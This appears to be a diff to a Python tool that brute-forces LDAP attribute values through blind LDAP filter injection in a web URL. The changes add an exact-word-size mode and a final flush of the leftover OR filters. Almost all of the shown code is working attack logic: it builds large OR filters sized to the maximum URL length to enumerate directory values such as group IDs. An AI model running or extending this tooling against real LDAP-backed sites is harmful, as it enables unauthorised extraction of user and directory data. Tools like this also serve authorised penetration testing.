@@ -98,24 +98,37 @@ def brute(base_url, true_string, charset):
 
     return exist
 
-def or_generate(charset, space_per_request, attribute_name, max_word_size):
+def or_generate(charset, space_per_request, attribute_name, word_size, size_is_exact):
     or_base = "(|%s)"
     or_base_len = len(or_base) - 2
 
     attr_base = "(%s=%s)"
     real_free = space_per_request - or_base_len
-    possibilities = itertools.product(charset, repeat=max_word_size)
+
+    if not size_is_exact:
+        i = 0
+    else:
+        i = word_size - 1
+
     tmp = ""
-    for poss in possibilities:
-        val = attr_base % (attribute_name, "".join(poss))
+    while i < word_size:
+        i += 1
+        possibilities = itertools.product(charset, repeat=i)
+        for poss in possibilities:
+            val = attr_base % (attribute_name, "".join(poss))
 
-        # too large! flush
-        if len(tmp) + len(val) > real_free :
-            or_clause = or_base % tmp
-            tmp = ""
-            yield or_clause
+            # too large! flush
+            if len(tmp) + len(val) > real_free :
+                or_clause = or_base % tmp
+                tmp = ""
+                yield or_clause
 
-        tmp += val
+            tmp += val
+
+    # flush the rest.
+    if tmp != "":
+        or_clause = or_base % tmp
+        yield or_clause
 
 # Goes through each of the or filters, a string sort of like this:
 # (|(gidNumber=18880)(gidNumber=18881)(gidNumber=18882)(gidNumber=18883)...)
@@ -127,15 +140,15 @@ def or_loop(or_subfilter):
             yield spl + ")"
 
 # all parameters are arguments gotten from the command line.
-def brute_nowild(base_url, true_string, charset, max_path_size, attribute_name, max_word_size):
+def brute_nowild(base_url, true_string, charset, max_path_size, attribute_name, word_size, size_is_exact):
     logging.info("Entering non-wildcard mode for URL '%s' (bruteforcing '%s')." % (base_url, attribute_name))
-    logging.debug("Going to brute with chars %s up to %s length" % (charset, max_word_size))
+    logging.debug("Going to brute with chars %s up to %s length" % (charset, word_size))
 
     # we are going to do (|(cn="a")(cn="b")[...]) until max_path_size so as to know if any of the
     # possibilities are valid.
     exist = []
     space_per_request = max_path_size - (len(base_url) - 2)
-    or_subfilters = or_generate(charset, space_per_request, attribute_name, max_word_size)
+    or_subfilters = or_generate(charset, space_per_request, attribute_name, word_size, size_is_exact)
     for or_subfilter in or_subfilters:
         url = base_url % or_subfilter
         if request_true(url, true_string):
@@ -182,10 +195,14 @@ def parser_get():
         bruteforcing DN names, which don't support wildcards, we create massive
         filters like (!(val=value1)(val=value2))[...] to be more efficient. This
         defines how long requests will be.""", default=8100)
-    parser.add_argument("--max-word-size", help="""For wildcard only: the max
-        max length we are going to attempt to bruteforce.""", type=int, default=6)
     parser.add_argument("--attribute-name", "-a", help="""Required for
         non-wildcard bruteforcing.""")
+
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument("--max-word-size", help="""For wildcard only: the max
+        max length we are going to attempt to bruteforce.""", type=int, default=6)
+    group.add_argument("--exact-word-size", help="""For wildcard only: The
+        exact length of the string we are going to bruteforce.""", default=None, type=int)
 
     return parser
 
@@ -211,7 +228,7 @@ def succ(result):
 
         sys.exit(1)
     else:
-        print("No results found (%s.)")
+        print("No results found (%s.)" % time_info)
         sys.exit(1)
 
 def err(message):
@@ -233,8 +250,20 @@ if __name__ == '__main__':
     if not args.no_wildcard:
         valid_values = brute(args.URL, args.TRUE_STRING, charset)
     else :
+
         if not args.attribute_name :
             err("Attribute name is required for non-wildcard bruteforcing. Please specify it with --attribute-name.")
-        valid_values = brute_nowild(args.URL, args.TRUE_STRING, charset, args.max_path_size, args.attribute_name, args.max_word_size)
+
+        if args.exact_word_size != None:
+            is_exact = True
+            word_size = args.exact_word_size
+        else:
+            is_exact = False
+            word_size = args.max_word_size
+
+        valid_values = brute_nowild(base_url=args.URL,
+            true_string=args.TRUE_STRING, charset=charset,
+            max_path_size=args.max_path_size, attribute_name=args.attribute_name,
+            word_size=word_size, size_is_exact=is_exact)
 
     succ(valid_values)
